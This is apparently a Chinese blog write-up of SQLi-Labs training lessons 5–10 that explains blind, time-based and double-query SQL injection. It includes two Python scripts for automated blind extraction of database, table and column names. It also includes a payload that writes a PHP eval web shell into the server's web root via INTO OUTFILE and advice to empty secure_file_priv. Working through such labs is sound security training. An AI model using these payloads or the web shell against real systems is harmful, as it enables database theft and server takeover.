+<h3 id="Less-5-GET-双注入-单引号字符型注入"><a href="#Less-5-GET-双注入-单引号字符型注入" class="headerlink" title="Less-5 GET-双注入-单引号字符型注入"></a>Less-5 GET-双注入-单引号字符型注入</h3><p>1、单引号测试，报错；单引号闭合<br><img src="https://img-blog.csdnimg.cn/20190731115948411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、<code>order by </code>查到3个字段<br><img src="https://img-blog.csdnimg.cn/20190731120249494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、联合查询，没有回显<br><img src="https://img-blog.csdnimg.cn/20190731120416847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>两种方法：</p>
+<hr>
+<hr>
+<h4 id="一、盲注"><a href="#一、盲注" class="headerlink" title="一、盲注"></a>一、盲注</h4><p><strong>burp</strong><br>i-4、<code>id=1&#39; and (length(database()))&gt;3--+</code>测试数据库长度是否为3，如果不是就往下猜，如果嫌麻烦可以用bp自动化猜解，可以看到，数据库长度为8（测试含0）<br><img src="https://img-blog.csdnimg.cn/20190801093707692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>i-5、其他同理<br><code>id=1 and substr(database(),1,1)=&#39;a&#39; --+</code> 判断数据库第一个字符是否为a<br><code>id=1&#39; and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=&#39;a&#39; --+</code> 判断表名第一个字符是否为a</p>
+<hr>
+<p><strong>脚本</strong><br>猜数据库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#C:\python</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="comment">#数据库的名称查找</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">answer = <span class="string">&quot;&quot;</span></span><br><span class="line">value =<span class="string">&quot;abcdefghigklmnopqrstuvwxyz@_.&quot;</span><span class="comment">#数据库字典，一般为小写，如不放心或猜不出来请自行增加大写及数字</span></span><br><span class="line">url_length = <span class="string">&quot;http://localhost/Less-5/?id=1&#x27; and (length (&#123;0&#125;))=&#123;1&#125;--+&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/Less-5/?id=1&#x27; and substr(&#123;0&#125;,&#123;1&#125;,1)=&#x27;&#123;2&#125;&#x27; --+&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span>(<span class="params">payload</span>):</span></span><br><span class="line">	<span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		url_length_1 = url_length.format(payload,n)</span><br><span class="line">		print(<span class="string">&quot;正在判断数据库名称长度，请稍等...&#123;0&#125;&quot;</span>.format(n))</span><br><span class="line">		<span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">			headers = requests.get(url_length_1).headers</span><br><span class="line">			change = headers[<span class="string">&#x27;Content-Length&#x27;</span>]</span><br><span class="line">		headers = requests.get(url_length_1).headers</span><br><span class="line">		length = headers[<span class="string">&#x27;Content-Length&#x27;</span>]</span><br><span class="line">		<span class="keyword">if</span> length != change :</span><br><span class="line">			print(<span class="string">&quot;数据库名称长度:&#123;0&#125;&quot;</span>.format(n+<span class="number">1</span>))</span><br><span class="line">			<span class="keyword">return</span> n+<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span>(<span class="params">payload,value,length</span>):</span></span><br><span class="line">	<span class="keyword">global</span> answer</span><br><span class="line">	now = <span class="number">0</span></span><br><span class="line">	print(<span class="string">&quot;正在判断数据库名称，请稍等...&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,length) :</span><br><span class="line">		<span class="keyword">for</span> v <span class="keyword">in</span> value :</span><br><span class="line">			now += <span class="number">1</span></span><br><span class="line">			url_data = url.format(payload,n,v)</span><br><span class="line">			<span class="keyword">if</span> v == <span class="string">&#x27;a&#x27;</span> :</span><br><span class="line">				headers = requests.get(url_data).headers</span><br><span class="line">				change = headers[<span class="string">&#x27;Content-Length&#x27;</span>]</span><br><span class="line">			headers = requests.get(url_data).headers</span><br><span class="line">			length = headers[<span class="string">&#x27;Content-Length&#x27;</span>]</span><br><span class="line">			<span class="keyword">if</span> length != change :</span><br><span class="line">				print(<span class="string">&quot;数据库名称第 &#123;0&#125; 个字符为：&#123;1&#125;&quot;</span>.format(n,v))</span><br><span class="line">				answer += v</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">database_payload = <span class="string">&quot;database()&quot;</span></span><br><span class="line">get_database(database_payload,value,get_length(database_payload))</span><br><span class="line">print(<span class="string">&quot;数据库名称为：&#123;0&#125;&quot;</span>.format(answer))</span><br></pre></td></tr></table></figure>
+<p>其他的改改payload就行了</p>
+<hr>
+<h4 id="双注入"><a href="#双注入" class="headerlink" title="双注入"></a>双注入</h4><p>这个我不太会，以后会填坑<br>    ———————————–<br>2019-12-1<br>我来填坑了，哈哈哈，间隔时间有点长，心沉不下去，太浮躁了<br>原理我就不讲了，参考大佬的文章(不分先后)</p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection">https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection</a><br><a target="_blank" rel="noopener" href="https://www.2cto.com/article/201303/192718.html">https://www.2cto.com/article/201303/192718.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xdans/p/5412468.html">https://www.cnblogs.com/xdans/p/5412468.html</a></p>
+<p>有个原因我也理解很久，就是大佬文章中提到的，为何插入虚拟表的时候又要执行一次rand(0)？<br>大佬说的是：对于数据库而言，rand(0)就是一个未知的变量，它必须确定具体值才能写入虚拟表。<br>我自己的理解是：当虚表中没有rand(0)<em>2的键值时需要再次rand(0)*2以确定键值是否正确，并取第二次rand(0)*2的值为键值，当有此键值时就不需要在确定了，直接计数+1即可<br>    ———————————–<br>先手工：<br>1、暴库：``?id=1’ union select count(</em>),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()<em>2))as a from information_schema.tables group by a limit 0,10 –+<code> 2、暴表：</code>?id=1’ union select null,count(</em>),concat((select column_name from information_schema.columns where table_name=’users’ limit 0,1),floor(rand()<em>2))as a from information_schema.tables group by a%23<code> 3、暴列：</code>?id=1’ union select null,count(</em>),concat((select column_name from information_schema.columns where table_name=’users’ limit 7,1),floor(rand()<em>2))as a from information_schema.tables group by a%23<code> 4、暴值：</code>?id=1’ union select null,count(</em>),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23``</p>
+<hr>
+<h3 id="LESS-6-GET-双注入-双引号字符型注入"><a href="#LESS-6-GET-双注入-双引号字符型注入" class="headerlink" title="LESS-6 GET-双注入-双引号字符型注入"></a>LESS-6 GET-双注入-双引号字符型注入</h3><p>1、单引号，返回正常，双引号，报错，order by查到3个字段，和LESS5相同，脚本仅需将单引号改为双引号即可</p>
+<hr>
+<h3 id="LESS-7-GET-导出文件-字符型注入"><a href="#LESS-7-GET-导出文件-字符型注入" class="headerlink" title="LESS-7 GET-导出文件-字符型注入"></a>LESS-7 GET-导出文件-字符型注入</h3><p>1、输入id后提示导出文件<br><img src="https://img-blog.csdnimg.cn/20190908162019896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<hr>
+<ul>
+<li><p>知识点：<br>  导出文件可以将查询的结果导出到某一文件中，我们可以利用这个漏洞将小马导入到服务器中<code>select &quot;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&quot; into outfile &quot;xxx\\x.php&quot;</code><br>  但是这里的路径我们要使用绝对路径，常用的绝对路径可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/hardhard123/article/details/80062733">这篇博客</a>，当然我们也可以用下面两个“函数”爆出数据库路径<br>  <code>@@datadir</code>    查看数据库路径<br>  <code>@@basedir</code>    查看MySQL安装路径<br>  不过本题过滤了错误，并不会直接输出路径，所以我们可以借助前几题来看<br>  拿第一关举个例子：<br>  <img src="https://img-blog.csdnimg.cn/20190908174128288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>  看到phpstudy可以知道网站根目录的绝对路径为：D:\phpstudy\WWW</p>
+</li>
+<li><p><strong>请注意在上传过程中路径的<code>\</code>会被转义，所以要用<code>\\</code>代替</strong></p>
+<hr>
+<p>2、猜一下闭合方式,第三个显示正常</p>
+<pre><code>  `?id=1&#39;--+`        `?id=1&#39;)--+`        `?id=1&#39;))--+`
+  ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019090817400474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)</code></pre>
+<p>3、顺便查一下字段<code>?id=1&#39;)) order by 3--+</code><br><img src="https://img-blog.csdnimg.cn/20190908174632616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4、上马?<code>?id=-1&#39;)) union select 1,&#39;&lt;?php@eval($_POST[&quot;caidao&quot;]);?&gt;&#39;,3 into outfile &#39;D:\\phpstudy_pro\\WWW\\test.php&#39;--+</code><br>虽然提示报错了，但不用管他，文件还是上传成功了，若失败，看下一条知识点<br><img src="https://img-blog.csdnimg.cn/20190908182144834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<hr>
+<ul>
+<li>知识点又来啦</li>
+<li>如果上传失败的话，可能是MySQL没有配置好，我就因为这个费点时间，打开MySQL配置<code>my.ini</code>，将<code>secure_file_priv</code>置空，如果没有，自行添加 <code>secure_file_priv =  </code>，这样就可以让文件上传到任何位置，等号后添加路径的话，文件只能上传到此目录下！</li>
+</ul>
+<h2 id=""><a href="#" class="headerlink" title="-"></a>-</h2><p>5、菜刀/蚁剑连接即可</p>
+<hr>
+<h3 id="LESS-8-GET-布尔盲注-单引号字符型注入"><a href="#LESS-8-GET-布尔盲注-单引号字符型注入" class="headerlink" title="LESS-8 GET-布尔盲注-单引号字符型注入"></a>LESS-8 GET-布尔盲注-单引号字符型注入</h3><p>1、<code>id=1&#39;--+</code>页面正常，其他没回显<br><img src="https://img-blog.csdnimg.cn/20191011090606997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<hr>
+<h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><ul>
+<li>==length()函数== 判断库名、表名、列名的长度</li>
+<li>==if(a,b,c)函数== 判断式，类似a?b:c</li>
+<li>==ascii()函数== 把字符转化为ASCII码</li>
+<li>==substring(a,b,c)字符串截取函数== a是要截取的字符串，b是截取字符串的起始位置，c是你想要截取字符串的位数    c根据上一步猜测的数据库长度写</li>
+<li>==sleep()函数== 控制返回时间</li>
+<li>==left(str,len)函数== 对字符串str左截取len长度</li>
+<li>==right(str,len)函数== 对字符串str右截取len长度</li>
+<li>盲注一般先猜长度，然后再猜名字，固定格式为 ==and ascii(substr(S,1,1))=N== 或 ==and if(ascii(substr(S,1,1))&gt;N,1,0)== S一般为selct语句，N为ASCII码</li>
+<li>盲注一般不会手工，太费时间，还不一定对，写脚本吧</li>
+</ul>
+<hr>
+<p>2、我们先测试一下数据库第一个字符是否为s（ASCII码为115）<br><img src="https://img-blog.csdnimg.cn/20191011160657382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、本人小白，写的脚本比较菜，欢迎各位大佬指点，脚本判断数据库用的结合时间的盲注，会比较慢，关于内容的爆破可以自己试试，不难<br>在爆破列的时候直接用的<code>users</code>表，踩了个小坑，此表应该是只有3个列，可是盲注出6个，去数据库查了下，果然是6个，但是在查所有字段时，却是三个。<br><img src="https://img-blog.csdnimg.cn/20191013141612628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>关于前三个列，去查了下，似乎是MySQL里面自带的sys库中的，<a target="_blank" rel="noopener" href="https://blog.csdn.net/jayewu/article/details/80183274">参考链接</a><br><img src="https://img-blog.csdnimg.cn/20191013141749939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.sql.com/Less-8/?id=1&#x27;  &quot;</span></span><br><span class="line">db_length = <span class="number">0</span></span><br><span class="line">db_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tb_num = <span class="number">0</span></span><br><span class="line">tb_length = <span class="number">0</span></span><br><span class="line">tb_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tb_list = []</span><br><span class="line">column_num = <span class="number">0</span></span><br><span class="line">column_length = <span class="number">0</span></span><br><span class="line">column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">column_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment">###   数据库长度与名称   ###</span></span><br><span class="line">print(<span class="string">&quot;正在判断数据库名称长度...&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">	db_pyload = <span class="string">&quot;and(if((length(database())=%d),sleep(3),0))--+&quot;</span>% i</span><br><span class="line">	r = requests.get(url+db_pyload)</span><br><span class="line">	time = r.elapsed.total_seconds()</span><br><span class="line">	<span class="comment">#print(time)获取响应时间</span></span><br><span class="line">	<span class="keyword">if</span> time &gt; <span class="number">3</span>:</span><br><span class="line">		db_length = i</span><br><span class="line">		print(<span class="string">&quot;数据库名称长度为：%d&quot;</span>% db_length)</span><br><span class="line">		print(<span class="string">&quot;-----------------------------------------&quot;</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;正在获取数据库名称...&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,db_length+<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">123</span>):</span><br><span class="line">		db_pyload = <span class="string">&quot;and(if(ascii(substr((select database()),%d,1))=%d,sleep(3),0))--+&quot;</span>% (i,j)</span><br><span class="line">		r = requests.get(url+db_pyload)</span><br><span class="line">		time = r.elapsed.total_seconds()</span><br><span class="line">		<span class="keyword">if</span> time &gt; <span class="number">3</span>:</span><br><span class="line">			db_name += chr(j)</span><br><span class="line">			print(<span class="string">&#x27;\r&#x27;</span>+db_name,end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;\n-----------------------------------------&quot;</span>)</span><br><span class="line"><span class="comment">###   数据库表个数与名称   ###</span></span><br><span class="line">print(<span class="string">&quot;正在判断数据库中表的个数...&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	tb_pyload = <span class="string">&quot;and if(((select count(*) from information_schema.tables where table_schema=&#x27;%s&#x27;)=%d),sleep(3),0)--+&quot;</span>% (db_name,i)</span><br><span class="line">	r = requests.get(url+tb_pyload)</span><br><span class="line">	time = r.elapsed.total_seconds()</span><br><span class="line">	<span class="keyword">if</span> time &gt; <span class="number">3</span>:</span><br><span class="line">		tb_num = i</span><br><span class="line">		print(<span class="string">&quot;此数据库中共有%d个表&quot;</span>% tb_num)</span><br><span class="line">		print(<span class="string">&quot;-----------------------------------------&quot;</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;正在获取表名...&quot;</span>)</span><br><span class="line"><span class="comment">###每张表的表长及表名###</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,tb_num):</span><br><span class="line">	tb_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="comment">###表名长度###</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">		tb_pyload = <span class="string">&quot;and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+&quot;</span>% (i,j)</span><br><span class="line">		r = requests.get(url+tb_pyload)</span><br><span class="line">		<span class="comment">#print(url+tb_pyload)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			tb_length = j</span><br><span class="line">			<span class="comment">#print(tb_length)</span></span><br><span class="line">			<span class="comment">###表名###</span></span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,tb_length+<span class="number">1</span>):</span><br><span class="line">				<span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">123</span>):</span><br><span class="line">					tb_pyload = <span class="string">&quot;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+&quot;</span>% (i,k,l)</span><br><span class="line">					r = requests.get(url+tb_pyload)</span><br><span class="line">					<span class="comment">#print(url+tb_pyload)</span></span><br><span class="line">					<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">						tb_name += chr(l)</span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line">			print(<span class="string">&quot;[+]&quot;</span>+tb_name)</span><br><span class="line">			tb_list.append(tb_name)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;表名：&quot;</span>,tb_list)</span><br><span class="line"><span class="comment">###   表的列个数与名称   ###</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tb_list:</span><br><span class="line">	<span class="comment">###列的个数###</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">		column_pyload = <span class="string">&quot;and (select count(column_name) from information_schema.columns where table_name=&#x27;%s&#x27;)=%d--+&quot;</span>% (i,j)</span><br><span class="line">		r = requests.get(url+column_pyload)</span><br><span class="line">		<span class="comment">#print(url+column_pyload)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			column_num = j</span><br><span class="line">			print((<span class="string">&quot;[+] 表名：%-10s\t&quot;</span> % i) + <span class="string">&#x27;共&#x27;</span> + str(column_num) + <span class="string">&#x27;列&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="comment">###列长度，例子:ures###</span></span><br><span class="line">print(<span class="string">&#x27;%s表中的列名：&#x27;</span> % tb_list[<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">6</span>):</span><br><span class="line">	column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">25</span>):</span><br><span class="line">		column_pyload = <span class="string">&quot;and (select length(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1)=%d--+&quot;</span>% (tb_list[<span class="number">-1</span>],i,j)</span><br><span class="line">		r = requests.get(url+column_pyload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			column_length = j</span><br><span class="line">			<span class="comment">###列名###</span></span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,column_length+<span class="number">1</span>):</span><br><span class="line">				<span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">123</span>):</span><br><span class="line">					column_pyload = <span class="string">&quot;and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1),%d,1))=%d--+&quot;</span>% (tb_list[<span class="number">-1</span>],i,k,l)</span><br><span class="line">					r = requests.get(url+column_pyload)</span><br><span class="line">					<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">						column_name += chr(l)</span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line">			print(<span class="string">&quot;[+]&quot;</span>+column_name)</span><br><span class="line">			column_list.append(column_name)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;列名：&quot;</span>,column_list)</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="LESS-9-GET-基于时间的盲注-单引号字符型注入"><a href="#LESS-9-GET-基于时间的盲注-单引号字符型注入" class="headerlink" title="LESS-9 GET-基于时间的盲注-单引号字符型注入"></a>LESS-9 GET-基于时间的盲注-单引号字符型注入</h3><p>1、这一关，用单引号和双引号都没有报错，输入%df也正常，试一下sleep函数<br><code>id=1&#39; and sleep(5)--+</code>发现页面5秒后才返回<br><img src="https://img-blog.csdnimg.cn/20191013142933430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、与上一题不同的是，本关不能根据页面是否有 ==You are in== 来判断匹配字符是否正确，所以我们都需要用<code>sleep函数</code>，可以参考第八关是怎么猜数据库的</p>
+<hr>
+<h3 id="LESS-10-GET-基于时间的盲注-双引号字符型注入"><a href="#LESS-10-GET-基于时间的盲注-双引号字符型注入" class="headerlink" title="LESS-10 GET-基于时间的盲注-双引号字符型注入"></a>LESS-10 GET-基于时间的盲注-双引号字符型注入</h3><p>1、与第九关相同，仅需将单引号改为双引号即可</p>
+<hr>
+<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1>
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="yq1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="yq1ng 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>yq1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2019/17JD2NV/" title="SQLi-Labs 修炼手册 （Less-1-10）">http://example.com/2019/17JD2NV/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/" rel="tag"><i class="fa fa-tag"></i> ...</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/21BA9MC/" rel="prev" title="第三届“百越杯”福建省高校网络空间安全大赛-Do you know upload?-WP">
+      <i class="fa fa-chevron-left"></i> 第三届“百越杯”福建省高校网络空间安全大赛-Do you know upload?-WP
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/C7SS0W/" rel="next" title="BugkuCTF-web-秋名山车神 writeup">
+      BugkuCTF-web-秋名山车神 writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
